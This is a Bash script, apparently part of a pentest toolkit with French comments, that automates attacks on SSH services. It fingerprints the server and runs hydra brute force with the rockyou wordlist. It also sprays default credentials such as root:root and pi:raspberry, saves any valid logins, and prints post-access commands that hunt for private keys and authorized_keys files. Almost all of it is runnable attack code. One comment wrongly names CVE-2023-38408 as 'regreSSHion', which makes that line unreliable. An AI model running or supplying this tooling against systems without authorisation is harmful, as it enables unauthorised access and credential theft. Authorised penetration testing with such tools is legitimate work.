#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — SSH (22)              ║
# ║   Usage: ./enum_ssh.sh <TARGET> [USER] [PASS]
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"

require_target "$TARGET"
banner "SSH (port 22)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "ssh")

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — version + scripts SSH" "$OUTDIR/nmap_ssh.txt" \
    nmap -p22 -sC -sV \
    --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods \
    -oN "$OUTDIR/nmap_ssh_raw.txt" \
    "$TARGET"

if check_tool ssh-audit; then
    run "ssh-audit — audit complet algos" "$OUTDIR/ssh_audit.txt" \
        ssh-audit "$TARGET"
fi

info "Banner grabbing (nc)"
cmd "nc -vn $TARGET 22"
timeout 5 nc -vn "$TARGET" 22 2>&1 | head -5 | tee "$OUTDIR/banner.txt"
echo ""

# Extraire version SSH
SSH_VERSION=$(grep -oP 'OpenSSH[_\s]\S+' "$OUTDIR/nmap_ssh.txt" 2>/dev/null | head -1)
if [[ -n "$SSH_VERSION" ]]; then
    finding "Version détectée : $SSH_VERSION"
fi

# Extraire méthodes d'auth
AUTH_METHODS=$(grep -i "Supported authentication" "$OUTDIR/nmap_ssh.txt" 2>/dev/null | head -3)
if [[ -n "$AUTH_METHODS" ]]; then
    finding "Auth methods : $AUTH_METHODS"
fi

# ─── 2. SCAN VULNÉRABILITÉS ─────────────────────────────────
section "2. VULNÉRABILITÉS CONNUES"

# Récupérer la version pour recherche CVE
if [[ -n "$SSH_VERSION" ]]; then
    warn "À vérifier manuellement :"
    echo -e "  ${YELLOW}→ regreSSHion CVE-2023-38408 (OpenSSH < 9.3p2)${NC}"
    echo -e "  ${YELLOW}→ libssh auth bypass CVE-2018-10933 (libssh < 0.8.1)${NC}"

    # Vérifier regreSSHion
    VERSION_NUM=$(echo "$SSH_VERSION" | grep -oP '\d+\.\d+' | head -1)
    if [[ -n "$VERSION_NUM" ]]; then
        info "Version numérique : $VERSION_NUM"
    fi
fi

if check_tool searchsploit; then
    run "Searchsploit — OpenSSH" "$OUTDIR/searchsploit.txt" \
        searchsploit OpenSSH --colour
fi

# ─── 3. ENUM USERS ──────────────────────────────────────────
section "3. ÉNUMÉRATION UTILISATEURS"

if check_tool msf-pattern-create || command -v msfconsole &>/dev/null; then
    info "Timing attack via Metasploit (si disponible) :"
    cmd "msf6 > use auxiliary/scanner/ssh/ssh_enumusers"
    echo "  set rhosts $TARGET" | tee -a "$OUTDIR/msf_commands.txt"
    echo "  set user_file /usr/share/seclists/Usernames/top-usernames-shortlist.txt" | tee -a "$OUTDIR/msf_commands.txt"
else
    warn "Metasploit non disponible — timing attack manuelle"
fi

# ─── 4. BRUTE FORCE ─────────────────────────────────────────
section "4. BRUTE FORCE (si USER connu)"

if [[ -n "$USER" ]]; then
    if check_tool hydra; then
        warn "Lancement brute force pour user: $USER"
        warn "Interrompre avec Ctrl+C si trop long"
        run_long "Hydra — brute force SSH" "$OUTDIR/hydra.txt" 120 \
            hydra -l "$USER" \
            -P /usr/share/wordlists/rockyou.txt \
            -t 4 -V \
            ssh://"$TARGET"
    fi
elif [[ -n "$PASS" ]]; then
    warn "PASSWORD fourni sans USER — essai avec users courants"
    for u in root admin user ubuntu kali pi; do
        info "Test $u:$PASS"
        timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            -o PasswordAuthentication=yes \
            "$u@$TARGET" "id" 2>/dev/null && {
            success "ACCÈS TROUVÉ : $u:$PASS"
            echo "$u:$PASS" >> "$OUTDIR/valid_creds.txt"
        }
    done
else
    info "Aucun user fourni — test connexion anonymous/default creds"
    for cred in "root:" "root:root" "admin:admin" "pi:raspberry" "ubuntu:ubuntu"; do
        u="${cred%%:*}"
        p="${cred##*:}"
        timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            -o PasswordAuthentication=yes \
            "$u@$TARGET" "id" 2>/dev/null && {
            success "ACCÈS TROUVÉ : $u:$p"
            echo "$u:$p" >> "$OUTDIR/valid_creds.txt"
        }
    done
fi

# ─── 5. TEST AVEC CREDENTIALS ───────────────────────────────
if [[ -n "$USER" && -n "$PASS" ]]; then
    section "5. TEST CONNEXION AVEC CREDENTIALS"
    info "Test connexion $USER:$PASS"
    timeout 10 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        -o PasswordAuthentication=yes \
        "$USER@$TARGET" "whoami && id && hostname" 2>&1 | tee "$OUTDIR/ssh_connect.txt"

    if grep -q "Permission denied" "$OUTDIR/ssh_connect.txt" 2>/dev/null; then
        error "Connexion échouée"
    else
        success "Connexion réussie !"
        finding "ACCÈS SSH : $USER@$TARGET"
    fi
fi

# ─── 6. CLÉS SSH POTENTIELLES ───────────────────────────────
section "6. RECHERCHE CLÉS SSH (si shell existant)"
echo -e "${GRAY}Commandes à exécuter une fois connecté :${NC}"
cat << 'EOF'
    find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
    cat ~/.ssh/authorized_keys 2>/dev/null
    cat ~/.ssh/known_hosts 2>/dev/null
EOF

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

# Rapport rapide
echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
grep -h "open\|filtered" "$OUTDIR/nmap_ssh.txt" 2>/dev/null | head -5
[[ -f "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials valides trouvés :"
    cat "$OUTDIR/valid_creds.txt"
}
